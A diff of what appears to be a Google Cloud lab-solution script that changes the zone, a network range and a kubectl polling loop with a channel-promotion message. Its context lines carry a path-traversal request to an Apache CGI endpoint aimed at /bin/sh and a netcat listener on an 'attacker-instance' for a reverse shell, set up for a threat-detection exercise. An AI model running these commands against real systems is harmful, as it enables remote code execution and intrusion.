@@ -3,7 +3,7 @@
 ## Run in cloudshell
 > IAM & ADMIN > Audit Logs > `Cloud Resource Manager API` > Admin Read > Save
 ```cmd
-export ZONE=us-central1-b
+export ZONE=us-central1-c
 REGION=${ZONE::-2}
 gcloud projects add-iam-policy-binding $DEVSHELL_PROJECT_ID \
 --member=user:demouser1@gmail.com --role=roles/bigquery.admin
@@ -41,7 +41,7 @@ sleep 30
 gcloud compute ssh --zone "$ZONE" "attacker-instance" --quiet
 ```
 ```cmd
-export ZONE=us-central1-b
+export ZONE=us-central1-c
 sudo snap remove google-cloud-cli
 curl -O https://dl.google.com/dl/cloudsdk/channels/rapid/downloads/google-cloud-cli-438.0.0-linux-x86_64.tar.gz
 tar -xf google-cloud-cli-438.0.0-linux-x86_64.tar.gz
@@ -59,13 +59,19 @@ gcloud container clusters create test-cluster \
 --num-nodes=1 \
 --master-ipv4-cidr "172.16.0.0/28" \
 --enable-master-authorized-networks \
---master-authorized-networks "10.128.0.0/20"
+--master-authorized-networks "10.138.0.0/20"
 sleep 30
-kubectl describe daemonsets container-watcher -n kube-system
-sleep 5
-kubectl describe daemonsets container-watcher -n kube-system
-sleep 2
-kubectl describe daemonsets container-watcher -n kube-system
+while true; do
+    output=$(kubectl describe daemonsets container-watcher -n kube-system)
+    if [[ $output == *container-watcher-unique-id* ]]; then
+        echo "Found unique ID in the output:"
+        echo "$output"
+        break
+    else
+        echo "SUBSCRIBE CLOUDHUSTLERS AND Comment on Video / Wait for sometime"
+        sleep 10
+    fi
+done
 ```
 ```cmd
 kubectl create deployment apache-deployment \
@@ -144,7 +150,7 @@ curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
 ```
 ### Open new terminal
 ```cmd
-export ZONE=us-central1-b
+export ZONE=us-central1-c
 gcloud compute ssh --zone "$ZONE" "attacker-instance" --quiet --command "nc -nlvp 8888"
 ```
 ### In first terminal 
